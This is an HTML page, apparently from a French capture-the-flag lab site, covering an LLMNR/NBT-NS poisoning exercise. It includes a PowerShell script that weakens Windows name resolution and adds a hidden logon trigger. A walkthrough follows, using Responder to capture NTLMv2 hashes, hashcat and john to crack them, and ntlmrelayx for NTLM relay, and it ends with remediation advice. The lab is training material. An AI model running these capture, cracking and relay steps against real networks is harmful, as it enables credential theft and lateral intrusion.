@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Flag 6 — LLMNR Poisoning - CryptAbyss 2026</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Flag 6 \u2014 LLMNR Poisoning";
+        var mkdocs_page_input_path = "windows/Flag6-LLMNR.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> CryptAbyss 2026
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Accueil</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Forensic</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier3-memory-dump/">Tier 3 — Memory Dump</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier4-disk-registre/">Tier 4 — Disk + Registre</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Crypto</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge1/">Challenge 1 - Base64</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge2/">Challenge 2 - Multi-layer Caesar</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">CryptAbyss 2026</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">Flag 6 — LLMNR Poisoning</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="flag-6-llmnr-poisoning">Flag 6 — LLMNR Poisoning</h1>
+<blockquote>
+<p><strong>Technique :</strong> LLMNR/NBT-NS Poisoning → Capture de hash NTLMv2
+<strong>Machine de déploiement :</strong> WS01 ET WS02
+<strong>Machine d'exploitation :</strong> Machine attaquante Linux (Kali/Parrot) sur VMnet2
+<strong>Compte de départ :</strong> <code>CTF\lowpriv</code> / <code>User@1234</code>
+<strong>Difficulté :</strong> Intermédiaire</p>
+</blockquote>
+<hr />
+<h2 id="deploiement">Déploiement</h2>
+<h3 id="prerequis">Prérequis</h3>
+<p>Ajouter une machine attaquante Linux (Kali ou Parrot) sur le réseau VMnet2 :</p>
+<table>
+<thead>
+<tr>
+<th>Paramètre</th>
+<th>Valeur</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Réseau</td>
+<td>VMnet2 (Host-only)</td>
+</tr>
+<tr>
+<td>IP</td>
+<td>192.168.10.50</td>
+</tr>
+<tr>
+<td>Outil requis</td>
+<td>Responder (<code>sudo apt install responder</code>)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="script-flag6-llmnrps1">Script — Flag6-LLMNR.ps1</h3>
+<blockquote>
+<p>[!warning] Lancer en PowerShell Admin sur WS01 ET WS02</p>
+</blockquote>
+<pre><code class="language-powershell">#Requires -RunAsAdministrator
+
+Write-Host &quot;`n[FLAG 6] LLMNR actif (lancer sur WS01 ET WS02)&quot; -ForegroundColor Cyan
+
+# --- 1. Activer LLMNR via registre ---
+$llmnrKey = &quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient&quot;
+if (-not (Test-Path $llmnrKey)) {
+    New-Item -Path $llmnrKey -Force | Out-Null
+}
+Set-ItemProperty -Path $llmnrKey -Name &quot;EnableMulticast&quot; -Value 1 -Type DWord
+Write-Host &quot;  [+] LLMNR active (EnableMulticast=1)&quot; -ForegroundColor Green
+
+# --- 2. Activer NBT-NS sur la carte reseau ---
+$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration |
+    Where-Object { $_.IPEnabled -eq $true }
+foreach ($a in $adapters) {
+    $a.SetTcpipNetbios(1) | Out-Null
+    Write-Host &quot;  [+] NetBIOS over TCP/IP active : $($a.Description)&quot; -ForegroundColor Green
+}
+
+# --- 3. Declencheur logon : hostname inexistant -&gt; declenche LLMNR ---
+$triggerPath = &quot;C:\ProgramData\CTF\llmnr_trigger.ps1&quot;
+New-Item -ItemType Directory -Path &quot;C:\ProgramData\CTF&quot; -Force | Out-Null
+@&quot;
+# Declencheur LLMNR - s execute au logon
+# fileserver-ctf n existe pas dans le DNS -&gt; Windows tente LLMNR sur le reseau local
+net use X: \\fileserver-ctf\share /persistent:no 2&gt;nul
+&quot;@ | Set-Content -Path $triggerPath -Encoding UTF8
+
+$regPath = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+Set-ItemProperty -Path $regPath -Name &quot;CTF-NetworkMapping&quot; `
+    -Value &quot;powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `&quot;$triggerPath`&quot;&quot;
+Write-Host &quot;  [+] Declencheur LLMNR ajoute au logon&quot; -ForegroundColor Green
+
+# --- 4. Verifications ---
+Write-Host &quot;`n  [*] Verification LLMNR :&quot; -ForegroundColor Yellow
+Get-ItemProperty $llmnrKey -Name EnableMulticast
+Write-Host &quot;`n  [*] Verification cle Run :&quot; -ForegroundColor Yellow
+Get-ItemProperty $regPath -Name &quot;CTF-NetworkMapping&quot;
+
+Write-Host &quot;`n[FLAG 6] DONE&quot; -ForegroundColor Green
+Write-Host &quot;  SNAPSHOT : $env:COMPUTERNAME - Flag6 deploye&quot; -ForegroundColor Yellow
+</code></pre>
+<hr />
+<h3 id="verification-du-deploiement">Vérification du déploiement</h3>
+<blockquote>
+<p>[!warning] Depuis PowerShell Admin sur WS01 et WS02</p>
+</blockquote>
+<pre><code class="language-powershell"># Verifier LLMNR
+Get-ItemProperty &quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient&quot; -Name EnableMulticast
+# Attendu : EnableMulticast = 1
+
+# Verifier le declencheur logon
+Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; -Name &quot;CTF-NetworkMapping&quot;
+# Attendu : chemin vers llmnr_trigger.ps1
+</code></pre>
+<blockquote>
+<p>[!success] Snapshots
+<strong><code>WS01 — Flag6 déployé</code></strong>
+<strong><code>WS02 — Flag6 déployé</code></strong></p>
+</blockquote>
+<hr />
+<h2 id="write-up">Write-up</h2>
+<h3 id="contexte">Contexte</h3>
+<p>LLMNR (Link-Local Multicast Name Resolution) est un protocole de résolution de noms utilisé en fallback quand le DNS ne répond pas. Quand une machine tente de résoudre un hostname inexistant, elle envoie une requête broadcast LLMNR sur le réseau local. Un attaquant peut répondre à cette requête en se faisant passer pour la machine demandée, forçant la victime à s'authentifier et révélant son hash NTLMv2.</p>
+<hr />
+<h3 id="prerequis_1">Prérequis</h3>
+<ul>
+<li>Machine attaquante Kali/Parrot connectée sur VMnet2 (192.168.10.50)</li>
+<li>Responder installé : <code>sudo apt install responder</code></li>
+</ul>
+<hr />
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="etape-1-lancer-responder-sur-la-machine-attaquante">Étape 1 — Lancer Responder sur la machine attaquante</h4>
+<pre><code class="language-bash">sudo responder -I eth0 -wrf
+</code></pre>
+<p>Laisser Responder en écoute et attendre.</p>
+<h4 id="etape-2-declencher-la-resolution-llmnr">Étape 2 — Déclencher la résolution LLMNR</h4>
+<p>Se connecter sur WS01 ou WS02 avec <code>CTF\lowpriv</code> / <code>User@1234</code>. Le script de logon tente automatiquement de mapper <code>\\fileserver-ctf\share</code>. Ce hostname n'existe pas dans le DNS → Windows émet une requête LLMNR sur le réseau local → Responder répond et capture le hash NTLMv2.</p>
+<h4 id="etape-3-lire-le-hash-capture-dans-responder">Étape 3 — Lire le hash capturé dans Responder</h4>
+<p><strong>Résultat dans le terminal Responder :</strong></p>
+<pre><code>[SMB] NTLMv2-SSP Client   : 192.168.10.20
+[SMB] NTLMv2-SSP Username : CTF\lowpriv
+[SMB] NTLMv2-SSP Hash     : lowpriv::CTF:1122334455667788:AABBCCDDEEFF...
+</code></pre>
+<p>Le hash est aussi enregistré dans :</p>
+<pre><code class="language-bash">cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.10.20.txt
+</code></pre>
+<h4 id="etape-4-cracker-le-hash-hors-ligne">Étape 4 — Cracker le hash hors ligne</h4>
+<pre><code class="language-bash"># Avec hashcat
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Avec john
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>lowpriv::CTF:... : User@1234
+</code></pre>
+<hr />
+<h3 id="recuperation-du-flag">Récupération du flag</h3>
+<p>Le hash NTLMv2 capturé <strong>est</strong> le flag de cet exercice. Selon la règle définie :</p>
+<ul>
+<li><strong>Option A</strong> — le hash brut capturé valide le flag</li>
+<li><strong>Option B</strong> — le mot de passe cracké <code>User@1234</code> valide le flag</li>
+</ul>
+<p>Le hash cracké peut ensuite être utilisé pour s'authentifier sur d'autres services du domaine avec les credentials de <code>lowpriv</code>.</p>
+<hr />
+<h3 id="aller-plus-loin-relais-ntlm">Aller plus loin — Relais NTLM</h3>
+<p>Au lieu de cracker le hash, on peut le relayer directement vers une autre machine :</p>
+<pre><code class="language-bash"># Desactiver SMB et HTTP dans Responder.conf avant de lancer
+sudo responder -I eth0 -wd
+
+# Dans un autre terminal, lancer ntlmrelayx
+sudo impacket-ntlmrelayx -t 192.168.10.10 -smb2support
+</code></pre>
+<hr />
+<h3 id="remediation">Remédiation</h3>
+<table>
+<thead>
+<tr>
+<th>Problème</th>
+<th>Correction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LLMNR activé</td>
+<td>Désactiver via GPO : <code>Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; Turn off multicast name resolution = Enabled</code></td>
+</tr>
+<tr>
+<td>NBT-NS activé</td>
+<td>Désactiver via les propriétés de la carte réseau ou via DHCP option 001</td>
+</tr>
+<tr>
+<td>Mots de passe faibles</td>
+<td>Politique de mots de passe complexes — <code>User@1234</code> ne doit pas être dans rockyou.txt</td>
+</tr>
+<tr>
+<td>Pas de détection</td>
+<td>Déployer un honeypot LLMNR pour détecter les poisoners sur le réseau</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="resume-de-la-chaine-dexploitation">Résumé de la chaîne d'exploitation</h3>
+<pre><code>Attaquant (Kali)
+  └─→ sudo responder -I eth0 -wrf → écoute sur VMnet2
+
+lowpriv se connecte sur WS01/WS02
+  └─→ script logon → net use \\fileserver-ctf\share
+        └─→ DNS : hostname inconnu → fallback LLMNR broadcast
+              └─→ Responder répond → victime s'authentifie
+                    └─→ hash NTLMv2 capturé : lowpriv::CTF:...
+                          └─→ hashcat -m 5600 → User@1234
+</code></pre>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
